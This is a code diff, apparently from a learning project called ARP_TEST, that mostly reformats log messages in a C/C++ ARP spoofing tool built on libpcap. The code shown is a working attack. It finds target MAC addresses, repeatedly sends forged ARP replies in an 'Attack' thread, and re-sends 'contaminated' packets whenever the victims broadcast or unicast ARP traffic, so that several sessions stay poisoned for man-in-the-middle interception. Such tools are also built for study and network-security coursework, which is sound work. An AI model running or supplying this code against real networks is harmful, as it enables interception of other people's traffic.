@@ -8,7 +8,6 @@ char* delChar(char* buf, char ch){
     char* result = (char*)malloc(strlen(buf));
     for(int i = 0; buf[i] != 0; i++){
         if(buf[i] != ch){
-            //printf("result : %s\n", result);
             result[cnt] = buf[i];
             cnt++;
         }
@@ -35,7 +34,6 @@ char* convert_mac(const char* data){
     while((stp = strtok(NULL, ":")) != NULL);
     buf[strlen(buf)] = '\0';
     strncpy(result_str, buf, strlen(buf));
-    //printf("result_str : %s, %d\n", result_str, strlen(result_str));
     return result_str;
 }
 
@@ -68,16 +66,15 @@ void* Attack(void* info){
 
     bzero(attack_packet->padding, 18);
 
-    while(1){ // 2 attacks per 1~6 random seconds
+    while(1){ // 2 attacks per 1~6 random seconds (asynchronous attack)
         for(int i = 0; i < 2; i++){
-            printf("\n----------_ARP %d_----------\n", PP->session_Number);
-            printf("sip : %s\n", PP->sip);
-            printf("smac : %s\n", PP->smac);
-            printf("tip : %s\n", PP->tip);
-            printf("tmac : %s\n", PP->tmac);
-            //Print_ARP(&attack_packet);
+            printf("\n----------_ARP (Session %d)_----------\n", PP->session_Number);
+            printf("[ sip : %s  ]\n", PP->sip);
+            printf("[ smac : %s ]\n", PP->smac);
+            printf("[ tip : %s  ]\n", PP->tip);
+            printf("[ tmac : %s ]\n\n", PP->tmac);
             if(pcap_sendpacket(PP->handle, reinterpret_cast<u_char*>(attack_packet), 42) != 0){
-                perror("send packet error");
+                perror("{ send packet error }");
                 exit(1);
             }
         }
@@ -89,9 +86,9 @@ struct Info_mymac* find_My_Mac(){
     struct Info_mymac* IM = (struct Info_mymac*)malloc(50);
     int sockfd, req_cnt = REQ_CNT;
     char* s_mac_addr = (char*)malloc(sizeof(char)*20);
-    if(s_mac_addr == NULL){ perror("s_mac_addr malloc error"); exit(1); }
+    if(s_mac_addr == NULL){ perror("{ s_mac_addr malloc error }"); exit(1); }
     char* s_ip_addr = (char*)malloc(sizeof(char)*20);
-    if(s_ip_addr == NULL){ perror("s_ip_addr malloc error"); exit(1); }
+    if(s_ip_addr == NULL){ perror("{ s_ip_addr malloc error }"); exit(1); }
 
     struct sockaddr_in* sock;
     struct ifconf ifcnf_s;
@@ -99,7 +96,7 @@ struct Info_mymac* find_My_Mac(){
 
     sockfd = socket(PF_INET, SOCK_DGRAM, 0);
     if(sockfd < 0){
-        perror("socket error");
+        perror("{ socket error }");
         return NULL;
     }
 
@@ -107,7 +104,7 @@ struct Info_mymac* find_My_Mac(){
     ifcnf_s.ifc_len = sizeof(struct ifreq) * req_cnt;
     ifcnf_s.ifc_buf = (char*)malloc(ifcnf_s.ifc_len);
     if(ioctl(sockfd, SIOCGIFCONF, (char*)&ifcnf_s) < 0){
-        perror("icoctl - SIOCGIFCONF error");
+        perror("{ icoctl - SIOCGIFCONF error }");
         return NULL;
     }
 
@@ -119,7 +116,7 @@ struct Info_mymac* find_My_Mac(){
     ifr_s = ifcnf_s.ifc_req;
     for(int cnt = 0; cnt < ifcnf_s.ifc_len; cnt += sizeof(struct ifreq), ifr_s++){
         if(ioctl(sockfd, SIOCGIFFLAGS, ifr_s) < 0){
-            perror("ioctl - SIOCGFFLAGS error");
+            perror("{ ioctl - SIOCGFFLAGS error }");
             return NULL;
         }
 
@@ -127,15 +124,13 @@ struct Info_mymac* find_My_Mac(){
         sock = (struct sockaddr_in*)&ifr_s->ifr_addr;
         sprintf(s_ip_addr, "%s", inet_ntoa(sock->sin_addr));
         if(ioctl(sockfd, SIOCGIFHWADDR, ifr_s) < 0){
-            perror("ioctl - SIOCGFHWADDR error");
+            perror("{ ioctl - SIOCGFHWADDR error }");
             return NULL;
         }
         strncpy(s_mac_addr, convert_mac(ether_ntoa((struct ether_addr*)(ifr_s->ifr_hwaddr.sa_data))), 20);
     }
     char* smac = (char*)malloc(sizeof(char)*20);
     strncpy(smac, delChar(s_mac_addr, ':'), sizeof(char)*20);
-    //printf("smac : %s\n", smac);
-
     strncpy(IM->my_mac, smac, strlen(smac));
     strncpy(IM->my_ip, s_ip_addr, strlen(s_ip_addr));
     return IM;
@@ -147,16 +142,14 @@ void* find_Mac(void* info){
     struct ARP_header* ah = (struct ARP_header*)malloc(sizeof(struct ARP_header));
     struct in_addr src_in_addr, target_in_addr;
     char* sender_mac = (char*)malloc(sizeof(char)*20);
-    if(sender_mac == NULL){ perror("sender_mac malloc error"); exit(1); }
+    if(sender_mac == NULL){ perror("{ sender_mac malloc error }"); exit(1); }
 
     printf("\n[ < Session %d > / Starting to find < %s > mac address ]\n", PP->session_Number, PP->tip);
 
     char broadcast_mac1[12] = {0};
-    if(broadcast_mac1 == NULL){ perror("broadcast_mac1 malloc error"); exit(1); }
     strncpy(broadcast_mac1, "ffffffffffff", 12);
 
     char broadcast_mac2[12] = {0};
-    if(broadcast_mac2 == NULL){ perror("broadcast_mac2 malloc error"); exit(1); }
     strncpy(broadcast_mac2, "000000000000", 12);
 
     ah->frame_type = htons(ARP_FRAME_TYPE);
@@ -170,8 +163,6 @@ void* find_Mac(void* info){
     PP->sip[strlen(PP->sip)] = '\0';
     tomar_ip_addr(&src_in_addr, PP->sip);
     tomar_ip_addr(&target_in_addr, PP->tip);
-    printf("PP->tip : %s\n", PP->tip);
-    printf("PP->sip : %s\n", PP->sip);
 
     tomar_mac_addr(ah->Destination_mac_addr, broadcast_mac1);
     tomar_mac_addr(ah->target_mac_addr, broadcast_mac2);
@@ -181,9 +172,9 @@ void* find_Mac(void* info){
     memcpy(ah->sender_ip_addr, &src_in_addr, IP_ADDR_LEN);
     memcpy(ah->target_ip_addr, &target_in_addr, IP_ADDR_LEN);
 
-    printf("ah->src_mac_addr : %02x%02x%02x%02x%02x%02x\n", ah->src_mac_addr[0], ah->src_mac_addr[1], ah->src_mac_addr[2], ah->src_mac_addr[3], ah->src_mac_addr[4], ah->src_mac_addr[5]);
-    printf("ah->sender_ip_addr : %d.%d.%d.%d\n", ah->sender_ip_addr[0], ah->sender_ip_addr[1], ah->sender_ip_addr[2], ah->sender_ip_addr[3]);
-    printf("ah->target_ip_addr : %d.%d.%d.%d\n", ah->target_ip_addr[0], ah->target_ip_addr[1], ah->target_ip_addr[2], ah->target_ip_addr[3]);
+    printf("[ Sender mac addr : %02x%02x%02x%02x%02x%02x ]\n", ah->src_mac_addr[0], ah->src_mac_addr[1], ah->src_mac_addr[2], ah->src_mac_addr[3], ah->src_mac_addr[4], ah->src_mac_addr[5]);
+    printf("[ Sender ip addr : %d.%d.%d.%d ]\n", ah->sender_ip_addr[0], ah->sender_ip_addr[1], ah->sender_ip_addr[2], ah->sender_ip_addr[3]);
+    printf("[ Target ip addr : %d.%d.%d.%d ]\n", ah->target_ip_addr[0], ah->target_ip_addr[1], ah->target_ip_addr[2], ah->target_ip_addr[3]);
     bzero(ah->padding, 18);
 
     struct ARP_header* temp;
@@ -193,7 +184,7 @@ void* find_Mac(void* info){
         printf("\n[ < Session %d > / send packet to < %s > / count : %d ]\n", PP->session_Number, PP->tip, count);
         for(int i = 0; i < 2; i++){
             if(pcap_sendpacket(PP->handle, reinterpret_cast<u_char*>(ah), 42) != 0){
-                perror("send packet error");
+                perror("{ send packet error }");
                 exit(1);
             }
         }
@@ -202,17 +193,16 @@ void* find_Mac(void* info){
         int res = pcap_next_ex(PP->handle, &header, &packet);
         if (res == -1 || res == -2) break;
         temp = (struct ARP_header*)(packet);
-        //check_ARP(packet);
 
-        printf("temp->frame_type : %04x\n", htons(temp->frame_type));
+        printf("[ Frame_type : %04x ]\n", htons(temp->frame_type));
         char* c = (char*)malloc(sizeof(4));
         if(c == NULL){ perror("c malloc error"); exit(1); }
         sprintf(c, "%02x", temp->op);
-        printf("temp->op : %s\n", c);
+        printf("[ Operation : %s ]\n", c);
         if(strcmp(c, "100") == 0)
-            printf("Request\n");
-        else if(strcmp(c, "200") == 0) printf("Reply\n");
-        else printf("Unknown\n");
+            printf("< Request >\n");
+        else if(strcmp(c, "200") == 0) printf("( Reply )\n");
+        else printf("{ Unknown }\n");
 
         char a[16] = {0};
         sprintf(a, "%d.%d.%d.%d", temp->sender_ip_addr[0],
@@ -222,11 +212,11 @@ temp->sender_ip_addr[1], temp->sender_ip_addr[2], temp->sender_ip_addr[3]);
         sprintf(b, "%d.%d.%d.%d", ah->target_ip_addr[0],
 ah->target_ip_addr[1], ah->target_ip_addr[2], ah->target_ip_addr[3]);
 
-        printf("temp->sender_ip_addr : %s\n", a);
-        printf("ah->target_ip_addr : %s\n", b);
+        printf("[ Packet's sender ip addr : %s ]\n", a);
+        printf("[ < Session %d > target ip addr : %s ]\n", PP->session_Number, b);
 
         if((temp->frame_type == htons(ARP_FRAME_TYPE)) && (temp->op == htons(OP_ARP_REPLY)) && (memcmp(temp->sender_ip_addr, ah->target_ip_addr, sizeof(temp->sender_ip_addr)) == 0)){
-            printf("[ Success to access %d ]\n", count);
+            printf("[ < Session %d > Success to access %d ]\n", PP->session_Number, count);
             break;
         }
         count++;
@@ -239,12 +229,12 @@ temp->sender_mac_addr[1], temp->sender_mac_addr[2], temp->sender_mac_addr[3], te
     return (void*)(sender_mac);
 }
 
-void* Manage_Session(struct Parameter_Pthread* pt3){
+void Manage_Session(struct Parameter_Pthread* pt3){
     struct pcap_pkthdr* header;
     const u_char* packet;
 
     int res = pcap_next_ex(pt3->handle, &header, &packet);
-    if (res == -1 || res == -2) return NULL;
+    if (res == -1 || res == -2) return ;
     printf("\n@ ######################## @\n");
     printf("[ -- Session < %d > %u Bytes captured -- ]\n", pt3->session_Number, header->caplen);
 
@@ -255,7 +245,7 @@ void* Manage_Session(struct Parameter_Pthread* pt3){
     tmp = eh.Print_Eth(packet);
     isCorrect = eh.Check_Eth(packet, pt3->smac, pt3->tmac, pt3->attack_mac);
 
-    printf("isCorrect : %d\n", isCorrect);
+    printf("[ isCorrect : %d ]\n", isCorrect);
     // Check spoofed packets
     if(isCorrect == 2){
         for(int x = 0; x < SESSION_NUM; x++){
@@ -305,21 +295,17 @@ void* Manage_Session(struct Parameter_Pthread* pt3){
             tomar_mac_addr(Ah->target_ip_addr, pt3->tmac);
 
             char aa[13];
-            //char* aa = (char*)malloc(sizeof(20));
-            //if(aa == NULL){ perror("aa malloc error"); exit(1); }
             sprintf(aa, "%02x%02x%02x%02x%02x%02x", Ah->sender_mac_addr[0], Ah->sender_mac_addr[1], Ah->sender_mac_addr[2], Ah->sender_mac_addr[3], Ah->sender_mac_addr[4], Ah->sender_mac_addr[5]);
 
             char bb[13];
-            //char* bb = (char*)malloc(sizeof(20));
-            //if(bb == NULL){ perror("aa malloc error"); exit(1); }
             sprintf(bb, "%02x%02x%02x%02x%02x%02x", Ah->target_ip_addr[0], Ah->target_ip_addr[1], Ah->target_ip_addr[2], Ah->target_ip_addr[3], Ah->target_ip_addr[4], Ah->target_ip_addr[5]);
 
-            printf("this->attack_mac : %s\n", pt3->attack_mac);
-            printf("Changed sender mac address : %s\n", aa);
-            printf("this->tip : %s\n", pt3->tip);
-            printf("Changed target mac address: %s\n", bb);
+            printf("[ Attacker's mac : %s ]\n", pt3->attack_mac);
+            printf("[ Changed sender mac address : %s ]\n", aa);
+            printf("[ Target mac address : %s ]\n", pt3->tip);
+            printf("[ Changed target mac address: %s ]\n", bb);
             if(pcap_sendpacket(pt3->handle,  reinterpret_cast<u_char*>(Ah), 42) != 0){
-                perror("send packet error");
+                perror("{ send packet error }");
                 exit(1);
             }
             Ethernet_header eh1;
@@ -357,10 +343,10 @@ void* Manage_Session(struct Parameter_Pthread* pt3){
         // attack 2 times
         for(int i = 0 ; i < 2; i++){
             if(pcap_sendpacket(pt3->handle,  reinterpret_cast<u_char*>(Ah2), 42) != 0){
-                perror("send packet error");
+                perror("{ send packet error }");
                 exit(1);
             }
-            printf("Success to send contaminated packet!\n");
+            printf("[ Success to send contaminated packet! ( Broadcast ) ( %d ) ]\n", i);
         }
     }
     // Check unicast packets sended by sender to target
@@ -389,27 +375,25 @@ void* Manage_Session(struct Parameter_Pthread* pt3){
 
         for(int i = 0 ; i < 2; i++){
             if(pcap_sendpacket(pt3->handle, reinterpret_cast<u_char*>(attack_packet), 42) != 0){
-                perror("send packet error");
+                perror("{ send packet error }");
                 exit(1);
             }
-            printf("Success to send contaminated packet!\n");
+            printf("[ Success to send contaminated packet! ( Unicast ) ( %d ) ]\n", i);
         }
     }
     else{
-        printf("This packet has no relation with this program.\n");
+        printf("{ This packet has no relation with this program. }\n");
     }
-    //while(1){
-
-    //}
 }
 
 void Print_Data(const u_char* Packet_DATA){
+    printf("[ ");
     for(int i = 0; i < 10; i++) printf("%02x ", Packet_DATA[i]);
-    printf("\n");
+    printf(" ]\n");
 }
 
-void usage() {
-    printf("syntax: ARP_TEST <interface>\n");
-    printf("sample: ARP_TEST %s\n", DEFAULT_DEVICE);
+void usage(char* device) {
+    printf("{ syntax: ARP_TEST <interface> }\n");
+    printf("{ sample: ARP_TEST %s (sender ip) (target ip) (target ip) (sender ip) (other sessions...) }\n", device);
 }
 
